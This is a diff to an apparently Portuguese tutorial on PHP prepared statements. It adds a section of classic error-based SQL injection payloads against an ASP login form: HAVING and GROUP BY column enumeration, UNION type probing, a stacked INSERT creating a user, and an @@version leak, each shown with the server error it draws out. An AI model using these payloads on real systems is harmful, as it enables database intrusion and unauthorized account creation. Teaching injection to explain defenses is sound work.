@@ -321,7 +321,7 @@ Este código está utilizando o estilo de prepared statements do **MySQLi** em P
 
 - **```while ($row = $result->fetch_assoc())```**: Este loop **itera sobre cada linha** de resultados retornada pela consulta. **```$result->fetch_assoc()```**: Esta função retorna cada linha de resultados da consulta como um array associativo, onde as chaves são os nomes das colunas da tabela ```employees```. Dentro do laço ```while```, você pode fazer algo com os dados em ```$row```. Por exemplo, exibir os valores das colunas, armazenar em outra estrutura, ou processá-los de acordo com a lógica de negócios da sua aplicação.
 
-### Exemplo de como manipular os dados:
+#### Exemplo de como manipular os dados:
 
 Dentro do loop ```while```, você pode acessar as colunas da tabela ```employees``` assim:
 
@@ -415,4 +415,64 @@ SELECT * FROM table WHERE userid = '12345';
 
 ---
 
+## 5) Outros códigos SQL de ataque
 
+
+### 5.1) ```Username: ' having 1=1—```
+
+-- Error
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14’
+[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'users.id' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause
+
+/process_login.asp, line 35
+
+**Conquista do hacker:** Ele descobre que existe uma tabela **users** e que a primeira coluna é ```users.id```
+Usando o comando ```HAVING 1=1 --``` faria com que qualquer coisa após o -- fosse desconsiderada, porque é um comentário em SQL. Por exemplo, a parte da consulta que verifica a senha seria ignorada, o que poderia permitir o login sem fornecer uma senha válida.
+
+### 5.2) ```Username: ' group by users.id having 1=1—```
+
+-- Error
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14’
+[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'users.username' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause
+
+/process_login.asp, line 35 
+
+**Conquita do hacker:** ele descobre que a segunda coluna da tabela users é ```username```
+
+### 5.3) ```Username: ' group by users.id, users.username having 1=1—```
+
+-- Error
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14’
+[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'users.password' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause
+
+/process_login.asp, line 35 
+
+**Conquita do hacker:** ele descobre que a terceira coluna da tabela users é ```password```.
+
+### 5.4) ```Username: ' union select sum(username) from users—```
+
+-- Error
+
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument
+
+/process_login.asp, line 35
+
+**Conquita do hacker:** ele descobre que a segunda coluna da tabela username tem variável do tipo **varchar**.
+
+### 5.5) De posse dos campos do banco de dados, pode-se encadear (com “;”) um comando de inserção:
+
+```Username: '; insert into users values(9999, ‘willy', 'foobar')--```
+
+### 5.6) Username: ' ' union select @@version,1,1,1—-
+
+-- Error
+
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft]
+[ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value
+'Microsoft SQL Server 2000 - 8.00.760 (Intel X86)
+
+Dec 17 2002 14:22:05 Copyright (c) 1988-2003 Microsoft Corporation Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 1)' to a column of data type int. 
+
+/process_login.asp, line 35
+
+**Conquita do hacker:** versão do banco de dados (Microsoft SQL Server 2000) e sistema operacional (Windows NT)
